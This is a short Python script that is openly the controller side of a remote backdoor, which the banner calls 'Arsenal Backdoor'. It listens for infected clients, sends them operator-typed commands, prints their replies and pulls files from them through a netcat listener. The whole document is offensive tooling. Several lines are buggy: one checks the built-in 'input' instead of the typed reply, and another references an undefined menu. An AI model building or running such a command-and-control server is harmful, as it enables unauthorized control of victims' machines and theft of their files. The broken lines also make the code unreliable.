#!/usr/bin/python3
import socket, sys, os, argparse, subprocess
from _thread import start_new_thread
parser = argparse.ArgumentParser(description='q*bert says goodbye')
parser.add_argument('-p', dest='port', help='Hosting port', required=True, type=int)
parser.add_argument('-s', dest='host', help='Hosting IP')
args = parser.parse_args()

clients = {}

if args.host is None:
    args.host = '0.0.0.0'

def get_file(filename):
    command = ["/bin/nc", "-lp", "12"]
    output = subprocess.run(command, stdout=subprocess.PIPE)
    with open(filename, 'wb') as f:
        f.write(output.stdout)

def client(conn, addr, buff):
    global clients
    if addr[0] not in clients:
        conn.send(b'Arsenal Backdoor\n')
        data = conn.recv(buff)
        print(addr[0]+':\n'+str(data.strip(), 'utf-8'))
        data = conn.recv(buff)
        print(addr[0]+':\n'+str(data.strip(), 'utf-8'))
        clients[addr[0]] = str(data.strip(), 'utf-8')
    print(clients)
    while True:
        holder = []
        length = conn.recv(buff)
        while len(''.join(holder)) < int(length):
            data = conn.recv(buff)
            holder.append(str(data.strip(), 'utf-8'))
        print(addr[0]+':\n'+''.join(holder))
        while True:
            try:
                reply=input('Enter command for %s: ' %addr[0])
            except ValueError:
                print("Bad input")
            if 'get_file' in input:
                start_new_thread(get_file, input.split(' ')[1])
            if input == '':
                continue
            else:
                conn.send(bytes(reply, 'utf-8'))
                print(reply)
                break
        if not data:
            break
    conn.close()
    print("\nClosed connection from %s:%s" %(addr[0],addr[1]))

def main():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    buff = 4096
    s.bind((args.host, args.port))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        print("Connection received from %s:%s" %(addr[0], addr[1]))
        try:
            start_new_thread(client, (conn, addr, buff))
        except socket.error:
            sys.stderr.write("[Error] %s\n" %socket.error.msg[1])
        except KeyboardInterrupt:
            print('[-] Server shutting down...')
            break

def draw_screen():
    global menu
    os.system('clear')
    print(menu)


if __name__ == '__main__':
    main()
